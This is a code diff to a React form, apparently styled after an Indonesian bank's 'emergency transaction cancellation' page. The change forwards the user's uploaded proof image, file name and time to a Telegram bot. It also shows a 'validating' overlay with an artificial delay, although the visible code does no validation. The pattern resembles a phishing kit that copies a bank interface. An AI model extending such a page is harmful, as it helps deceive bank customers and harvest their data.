@@ -2,6 +2,8 @@ import React, { useState, useRef } from 'react';
 import { ArrowLeft, AlertCircle, X } from 'lucide-react';
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
 import { TelegramService } from '../services/telegramService';
+import { getFormattedWibDateTime } from '../utils/dateUtils';
+import { FormSkeletonOverlay } from './FormSkeletonOverlay';
 
 interface MAdminBatalkanTransaksiViewProps {
   onBack: () => void;
@@ -71,10 +73,17 @@ export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewPr
     if (!selectedImage) return;
 
     setIsSubmitting(true);
-    const notificationSent = await TelegramService.sendFormData({
-      serviceType: 'batalkan-transaksi',
-      serviceTitle: 'Pembatalan Transaksi Darurat',
-    });
+    // Ensure smooth perceived performance with minimum skeleton animation display time
+    const [notificationSent] = await Promise.all([
+      TelegramService.sendFormData({
+        serviceType: 'batalkan-transaksi',
+        serviceTitle: 'Pembatalan Transaksi Darurat',
+        photoBase64: selectedImage || undefined,
+        fileName: fileName || 'bukti_transaksi.jpg',
+        waktuInput: getFormattedWibDateTime(),
+      }),
+      new Promise((resolve) => setTimeout(resolve, 750)),
+    ]);
     setIsSubmitting(false);
 
     if (!notificationSent) {
@@ -123,7 +132,14 @@ export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewPr
 
       {/* 2. MAIN CONTAINER (1:1 with Screenshot) */}
       <main className="w-full max-w-[420px] mx-auto px-4 py-3 sm:py-4 flex flex-col">
-        <div className="space-y-2.5">
+        <div className="space-y-2.5 relative">
+          {/* Subtle Skeleton Loading Overlay upon submit */}
+          <FormSkeletonOverlay
+            isVisible={isSubmitting}
+            type="upload"
+            message="Memvalidasi & memproses berkas bukti..."
+          />
+
           {/* Box 1: Section Title Bar */}
           <div className="w-full bg-white border border-[#cbd5e1] rounded-lg py-2 px-3 text-center shadow-xs">
             <h2 className="text-[13.5px] font-bold text-[#0c3b68] tracking-tight">
